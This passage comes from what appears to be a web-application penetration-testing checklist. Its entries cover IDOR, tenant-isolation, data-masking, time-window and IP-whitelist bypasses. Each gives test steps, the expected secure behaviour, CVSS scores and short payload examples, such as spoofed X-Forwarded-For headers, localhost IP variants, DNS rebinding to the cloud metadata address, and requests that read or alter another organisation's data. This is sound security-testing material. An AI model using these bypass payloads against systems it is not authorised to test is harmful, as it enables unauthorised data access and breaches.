**Expected Result:** Disabled modules should be inaccessible

**Payload Example:**

```
Direct API access to disabled module
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-044 — Module License Bypass
**Test Category:** Business Logic · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Module Access Control

**Test Steps:** 1. Module requires license 2. Manipulate license check 3. Access without valid license 4. Use premium module free

**Expected Result:** License checks should be server-side

**Payload Example:**

```
{"module":"premium",licensed:true}
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## AC-045 — Module Dependency Exploitation
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Module Access Control

**Test Steps:** 1. Identify module dependencies 2. Access parent via dependent 3. Bypass parent access control 4. Escalate module access

**Expected Result:** Dependencies should respect permissions

**Payload Example:**

```
Access admin module via reporting dependency
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Manual Testing

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-046 — Module Configuration IDOR
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Module Access Control

**Test Steps:** 1. Configure own module 2. Modify module_id 3. Configure another user's module 4. Modify victim's settings

**Expected Result:** Config access should verify ownership

**Payload Example:**

```
PUT /api/modules/victim_module/config
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-047 — Hidden Module Discovery
**Test Category:** Information Disclosure · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Module Access Control

**Test Steps:** 1. Enumerate module endpoints 2. Find hidden modules 3. Access undocumented modules 4. Discover admin functionality

**Expected Result:** Hidden modules should require auth

**Payload Example:**

```
/api/modules/internal_admin or /debug-module
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite Intruder / ffuf / dirsearch

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## AC-048 — Module Version Bypass
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Module Access Control

**Test Steps:** 1. Access restricted module version 2. Use older unrestricted version 3. Bypass version-based access 4. Use deprecated features

**Expected Result:** All versions should enforce access control

**Payload Example:**

```
/api/v1/module bypassing v2 restrictions
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-049 — Module Cross-Tenant Access
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Module Access Control

**Test Steps:** 1. Access own tenant's module 2. Modify tenant_id 3. Access another tenant's module 4. Cross-tenant data access

**Expected Result:** Tenant isolation should be enforced

**Payload Example:**

```
GET /api/tenants/victim_tenant/modules/data
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman / Autorize

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-050 — Module Installation Bypass
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Module Access Control

**Test Steps:** 1. Module requires installation approval 2. Install directly via API 3. Bypass approval workflow 4. Enable unapproved module

**Expected Result:** Installation should require approval

**Payload Example:**

```
POST /api/modules/dangerous/install without approval
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-051 — Module Uninstallation IDOR
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Module Access Control

**Test Steps:** 1. Uninstall own module 2. Modify target module_id 3. Uninstall victim's module 4. Disable their functionality

**Expected Result:** Uninstallation should verify ownership

**Payload Example:**

```
DELETE /api/users/victim/modules/critical_module
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-052 — Module Permission Scope Creep
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Module Access Control

**Test Steps:** 1. Module granted limited permissions 2. Access beyond granted scope 3. Exploit expanded access 4. Read/write beyond scope

**Expected Result:** Module scope should be enforced

**Payload Example:**

```
Module with read access performing writes
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Manual Testing

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-053 — Row-Level Security Bypass
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Data-Level Security

**Test Steps:** 1. Query data with user context 2. Modify query to bypass RLS 3. Access other users' rows 4. View unauthorized records

**Expected Result:** RLS should be enforced at database level

**Payload Example:**

```
Modify query to select all rows bypassing user filter
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / SQLMap / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-054 — Column-Level Security Bypass
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Data-Level Security

**Test Steps:** 1. Query permitted columns 2. Modify query to include restricted columns 3. Access sensitive columns 4. View restricted data

**Expected Result:** CLS should restrict column access

**Payload Example:**

```
Add salary or ssn to SELECT query
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-055 — Field-Level Access Bypass
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Data-Level Security

**Test Steps:** 1. View record with hidden fields 2. Request specific hidden fields 3. Access restricted fields 4. View sensitive data

**Expected Result:** Hidden fields should not be accessible

**Payload Example:**

```
?fields=id,name,password_hash or GraphQL field selection
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman / GraphQL

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-056 — Data Filter Manipulation
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Data-Level Security

**Test Steps:** 1. Data filtered by user ownership 2. Modify filter parameters 3. Remove ownership filter 4. Access all data

**Expected Result:** Filters should be server-enforced

**Payload Example:**

```
Remove owner_id filter from query
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-057 — Aggregate Data Bypass
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Data-Level Security

**Test Steps:** 1. Individual records protected 2. Access aggregated data 3. Infer individual values 4. Extract protected information

**Expected Result:** Aggregations should respect security

**Payload Example:**

```
Count/sum/avg revealing individual values
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-058 — Data Export IDOR
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Data-Level Security

**Test Steps:** 1. Export own data 2. Modify user_id or scope 3. Export others' data 4. Mass data exfiltration

**Expected Result:** Export should verify permissions

**Payload Example:**

```
GET /api/export?user_id=victim or scope=all
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-059 — GraphQL Data Over-fetching
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Data-Level Security

**Test Steps:** 1. Query GraphQL endpoint 2. Request fields beyond access 3. Receive unauthorized data 4. Extract sensitive information

**Expected Result:** GraphQL should enforce field-level security

**Payload Example:**

```
{ user(id:"victim") { email ssn creditCard } }
```

**Impact:** GraphQL abuse -&gt; introspection/IDOR/batching DoS -&gt; data exposure or availability.

**Tools:** GraphQL Voyager / Altair / Burp Suite

**References:** CWE-400; -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP GraphQL Cheat Sheet; PortSwigger

---

## AC-060 — Soft Delete Data Access
**Test Category:** Information Disclosure · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Data-Level Security

**Test Steps:** 1. Record soft deleted 2. Query with include_deleted 3. Access deleted records 4. View supposedly deleted data

**Expected Result:** Soft-deleted records should be filtered

**Payload Example:**

```
GET /api/records?include_deleted=true
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / Postman

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## AC-061 — Data Masking Bypass
**Test Category:** Information Disclosure · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Data-Level Security

**Test Steps:** 1. Data masked in response 2. Access via different endpoint 3. Receive unmasked data 4. View sensitive raw data

**Expected Result:** Masking should be consistent

**Payload Example:**

```
Access same data via export or raw endpoint
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / Postman

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## AC-062 — Historical Data Access
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Data-Level Security

**Test Steps:** 1. Current data access restricted 2. Access historical/audit data 3. View past versions 4. Extract restricted information

**Expected Result:** History should respect current permissions

**Payload Example:**

```
GET /api/records/123/history bypassing current restrictions
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-063 — Search Index Information Leak
**Test Category:** Information Disclosure · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Data-Level Security

**Test Steps:** 1. Data protected from direct access 2. Search indexed data 3. Extract via search results 4. Reconstruct protected data

**Expected Result:** Search should respect data security

**Payload Example:**

```
Search returning protected record details
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / Postman

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## AC-064 — Cache-Based Data Leak
**Test Category:** Information Disclosure · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Data-Level Security

**Test Steps:** 1. Data cached without security context 2. Access cached data 3. Bypass security via cache 4. View protected information

**Expected Result:** Cache should respect data-level security

**Payload Example:**

```
Access cached response from other user
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / Cache Analysis

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## AC-065 — Relationship Traversal Attack
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Data-Level Security

**Test Steps:** 1. Access permitted object 2. Traverse relationship to restricted object 3. Bypass direct access restriction 4. View unauthorized data

**Expected Result:** Relationships should respect permissions

**Payload Example:**

```
Access restricted data via permitted parent object
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / GraphQL / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-066 — Data Classification Bypass
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Data-Level Security

**Test Steps:** 1. Data classified as restricted 2. Access via unclassified endpoint 3. Bypass classification check 4. View restricted data

**Expected Result:** Classification should be enforced everywhere

**Payload Example:**

```
Access confidential data via public API
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-067 — Time Window Bypass via Timestamp
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Time-Based Access

**Test Steps:** 1. Access restricted by time window 2. Modify timestamp in request 3. Bypass time restriction 4. Access outside allowed window

**Expected Result:** Time should be server-validated

**Payload Example:**

```
{"access_time":"2024-01-01T12:00:00Z"} during restricted hours
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-068 — Expired Token Usage
**Test Category:** Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Time-Based Access

**Test Steps:** 1. Obtain time-limited token 2. Wait for expiration 3. Use expired token 4. Access after expiration

**Expected Result:** Expired tokens should be rejected

**Payload Example:**

```
Use token after expiry timestamp
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite / Postman

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## AC-069 — Timezone Manipulation
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Time-Based Access

**Test Steps:** 1. Access restricted by time 2. Change timezone header 3. Bypass time restriction 4. Access from "allowed" timezone

**Expected Result:** Server should use consistent timezone

**Payload Example:**

```
Timezone: Pacific/Honolulu to shift access window
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-070 — Trial Period Extension
**Test Category:** Business Logic · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Time-Based Access

**Test Steps:** 1. Start trial period 2. Manipulate trial_end date 3. Extend trial indefinitely 4. Free access to paid features

**Expected Result:** Trial dates should be immutable

**Payload Example:**

```
{"trial_ends_at":"2099-12-31T23:59:59Z"}
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## AC-071 — Scheduled Access Bypass
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Time-Based Access

**Test Steps:** 1. Access scheduled for future 2. Access before scheduled time 3. Bypass schedule restriction 4. Early access to content

**Expected Result:** Scheduled access should be enforced

**Payload Example:**

```
GET /api/content/scheduled_content_id before release
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-072 — Access Expiration Race Condition
**Test Category:** Race Condition · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Time-Based Access

**Test Steps:** 1. Access about to expire 2. Rapidly make requests 3. Continue after expiration 4. Extended unauthorized access

**Expected Result:** Expiration should be atomic

**Payload Example:**

```
Burst requests at expiration boundary
```

**Impact:** Race condition -&gt; limit/uniqueness bypass (duplicate accounts, rate-limit defeat, double-spend).

**Tools:** Turbo Intruder / Burp Suite

**References:** CWE-362; -&gt;[Race Condition checklist](#/checklist/racecondition); James Kettle Smashing the State Machine

---

## AC-073 — Time-Limited Link Forgery
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Time-Based Access

**Test Steps:** 1. Analyze time-limited link structure 2. Modify expiration timestamp 3. Create extended link 4. Access beyond expiry

**Expected Result:** Link expiration should be signed

**Payload Example:**

```
Modify expires parameter in URL
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / URL Analysis

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-074 — Business Hours Bypass
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Time-Based Access

**Test Steps:** 1. Feature restricted to business hours 2. Access outside hours 3. Bypass hour restriction 4. Use feature 24/7

**Expected Result:** Hour restrictions should be server-side

**Payload Example:**

```
Access admin panel at 3 AM
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Scheduled Testing

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-075 — Maintenance Window Access
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Time-Based Access

**Test Steps:** 1. System in maintenance mode 2. Find bypass method 3. Access during maintenance 4. Operate on inconsistent data

**Expected Result:** Maintenance mode should be enforced

**Payload Example:**

```
Access during maintenance via API
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-076 — Session Timeout Bypass
**Test Category:** Broken Authentication · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Time-Based Access

**Test Steps:** 1. Session has timeout 2. Keepalive without activity 3. Bypass timeout 4. Maintain indefinite session

**Expected Result:** Inactivity should trigger timeout

**Payload Example:**

```
Automated keepalive requests
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite / Custom Scripts

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## AC-077 — Embargo Date Bypass
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Time-Based Access

**Test Steps:** 1. Content under embargo 2. Access before embargo lifts 3. View embargoed content 4. Early information access

**Expected Result:** Embargo should be strictly enforced

**Payload Example:**

```
Access press release before embargo date
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## AC-078 — Clock Skew Exploitation
**Test Category:** Broken Access Control · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Time-Based Access

**Test Steps:** 1. Identify server clock 2. Exploit clock differences 3. Access during "allowed" server time 4. Bypass client time checks

**Expected Result:** Server time should be authoritative

**Payload Example:**

```
Exploit NTP or timezone differences
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Time Analysis

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-079 — IP Spoofing via Headers
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** IP Whitelisting

**Test Steps:** 1. Access restricted by IP 2. Add X-Forwarded-For header 3. Spoof whitelisted IP 4. Bypass IP restriction

**Expected Result:** IP should be from actual connection

**Payload Example:**

```
X-Forwarded-For: 10.0.0.1 (whitelisted IP)
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / curl

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-080 — X-Real-IP Header Bypass
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** IP Whitelisting

**Test Steps:** 1. IP whitelist enforced 2. Add X-Real-IP header 3. Spoof whitelisted address 4. Access restricted resource

**Expected Result:** Headers should not override real IP

**Payload Example:**

```
X-Real-IP: 192.168.1.1
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / curl

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-081 — Client-IP Header Manipulation
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** IP Whitelisting

**Test Steps:** 1. Access IP restricted endpoint 2. Try various IP headers 3. Find accepted header 4. Bypass whitelist

**Expected Result:** All IP headers should be validated

**Payload Example:**

```
Client-IP: 127.0.0.1 or CF-Connecting-IP spoofing
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / curl

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-082 — IPv6 Bypass of IPv4 Whitelist
**Test Category:** Security Bypass · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** IP Whitelisting

**Test Steps:** 1. IPv4 whitelist configured 2. Access via IPv6 3. Bypass IPv4 restriction 4. Access restricted resource

**Expected Result:** Both IP versions should be covered

**Payload Example:**

```
Access via ::1 or IPv6 equivalent
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / curl

**References:** CWE-840; PortSwigger Business logic

---

## AC-083 — Localhost Bypass via IP Variants
**Test Category:** Security Bypass · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** IP Whitelisting

**Test Steps:** 1. Localhost restricted 2. Try IP variants 3. Bypass restriction 4. Access admin interface

**Expected Result:** All localhost variants should be handled

**Payload Example:**

```
127.0.0.1/127.1/2130706433/0x7f000001/0177.0.0.1
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / curl

**References:** CWE-840; PortSwigger Business logic

---

## AC-084 — IP Whitelist IDOR
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** IP Whitelisting

**Test Steps:** 1. View own IP whitelist 2. Modify organization_id 3. View others' whitelist 4. Discover internal IPs

**Expected Result:** Whitelist access should verify ownership

**Payload Example:**

```
GET /api/orgs/victim_org/ip-whitelist
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-085 — IP Whitelist Modification IDOR
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** IP Whitelisting

**Test Steps:** 1. Add IP to own whitelist 2. Modify target org_id 3. Add attacker IP to victim's whitelist 4. Gain network access

**Expected Result:** Whitelist modification should verify authority

**Payload Example:**

```
POST /api/orgs/victim_org/ip-whitelist {"ip":"attacker_ip"}
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-086 — DNS Rebinding Attack
**Test Category:** Security Bypass · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** IP Whitelisting

**Test Steps:** 1. Setup DNS rebinding 2. Initial request to allowed IP 3. DNS switches to internal IP 4. Access internal resources

**Expected Result:** DNS resolution should be cached securely

**Payload Example:**

```
DNS rebinding to 169.254.169.254
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Custom DNS / Burp Suite

**References:** CWE-840; PortSwigger Business logic

---

## AC-087 — SSRF to Bypass IP Restriction
**Test Category:** Server-Side Request Forgery · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** IP Whitelisting

**Test Steps:** 1. Find SSRF vulnerability 2. Request from server IP 3. Server IP is whitelisted 4. Access restricted resources

**Expected Result:** SSRF should be prevented

